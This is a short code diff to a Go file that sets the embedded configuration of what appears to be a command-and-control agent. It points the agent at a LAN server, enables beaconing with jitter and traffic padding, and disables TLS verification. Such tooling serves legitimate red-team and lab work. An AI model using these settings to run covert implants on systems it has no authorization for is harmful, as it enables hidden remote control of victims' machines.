@@ -8,19 +8,19 @@ import (
 
 var embeddedAgentConfig = config.AgentConfig{
 	Protocol:          config.AgentProtocol("H1TLS"),
-	ServerIP:          "127.0.0.1",
+	ServerIP:          "192.168.2.138",
 	ServerPort:        "8888",
 	CheckInEndpoint:   "/",
 	ResultsEndpoint:   "/results",
 	WebsocketEndpoint: "/ws",
-	Delay:             time.Duration(1000000000),
+	Delay:             time.Duration(5000000000),
 	Jitter:            0.2,
-	CheckinMethod:     "POST",
+	CheckinMethod:     "GET",
 	EnablePadding:     true,
 	MinPaddingBytes:   64,
 	MaxPaddingBytes:   1024,
-	BeaconMode:        false,
-	UUID:              "d061e77c-d404-48f8-bb73-ef1f899833f5", // This will be the generated UUID pkg
+	BeaconMode:        true,
+	UUID:              "8054b68b-da17-48db-92e3-245807cf1e20", // This will be the generated UUID pkg
 	SkipVerifyTLS:     true,
 }
 
